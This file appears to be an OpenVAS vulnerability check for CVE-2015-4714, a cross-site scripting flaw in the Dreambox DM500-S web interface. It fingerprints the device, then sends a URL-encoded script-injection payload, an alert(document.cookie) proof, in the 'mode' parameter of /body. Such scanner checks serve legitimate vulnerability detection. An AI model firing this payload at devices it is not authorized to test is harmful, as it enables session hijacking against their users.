###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_dreambox_xss_vuln.nasl 3626 2016-06-30 06:46:24Z antu123 $
#
# DreamBox DM500-S Cross-Site Scripting (XSS) Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805071");
  script_version("$Revision: 3626 $");
  script_cve_id("CVE-2015-4714");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2016-06-30 08:46:24 +0200 (Thu, 30 Jun 2016) $");
  script_tag(name:"creation_date", value:"2015-06-25 13:00:26 +0530 (Thu, 25 Jun 2015)");
  script_tag(name:"qod_type", value:"exploit");
  script_name("DreamBox DM500-S Cross-Site Scripting (XSS) Vulnerability");

  script_tag(name: "summary" , value:"This host has DreamBox DM500-S and is
  prone to cross-site scripting vulnerability.");

  script_tag(name: "vuldetect" , value:"Send a crafted HTTP GET request and
  check whether it is able read the cookie or not");

  script_tag(name: "insight" , value:"The flaw is due to an input passed via
  the body and mode parameter is not properly sanitized.");

  script_tag(name: "impact" , value:"Successful exploitation will allow attacker
  to execute arbitrary HTML and script code in a user's browser session in the
  context of an affected site.

  Impact Level: Application");

  script_tag(name: "affected" , value:"Dreambox DM500");

  script_tag(name: "solution" , value:"No solution or patch was made available
  for at least one year since disclosure of this vulnerability. Likely none will
  be provided anymore. General solution options are to upgrade to a newer release,
  disable respective features, remove the product or replace the product by another
  one.");

  script_xref(name : "URL" , value : "http://www.scip.ch/en/?vuldb.75860");
  script_xref(name : "URL" , value : "https://packetstormsecurity.com/files/132214");

  script_summary("Check if Dreambox DM500 is vulnerable to cross-site scripting");
  script_tag(name:"solution_type", value:"WillNotFix");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Variable Initialization
DreamBoxPort = "";

## Get HTTP Port
DreamBoxPort = get_http_port(default:80);
if(!DreamBoxPort){
  DreamBoxPort = 80;
}

## Check Port State
if(!get_port_state(DreamBoxPort)){
  exit(0);
}

##Send Request and Receive Response
sndReq = http_get(item:string("/"), port:DreamBoxPort);
rcvRes = http_keepalive_send_recv(port:DreamBoxPort, data:sndReq);

# Confirm the Alpication
if("[Dreambox]<" >< rcvRes || ">Enigma Web Interface<" >< rcvRes
    && rcvRes =~ "HTTP/1\.[0-9]+ 200 OK")
{

  ## construct the exploit
  url = "/body?mode=zap52b06%3Cscript%3Ealert(document.cookie)%3C%2f" +
        "script%3Eca184&zapmode=0&zapsubmode=4";

  ## confirm the exploit
  if(http_vuln_check(port:DreamBoxPort, url:url, check_header:TRUE,
  pattern:"<script>alert\(document.cookie\)</script>",
  extra_check:"parent.setTitle"))
  {
    report = report_vuln_url( port:DreamBoxPort, url:url );
    security_message(port:DreamBoxPort, data:report);
    exit(0);
  }
}
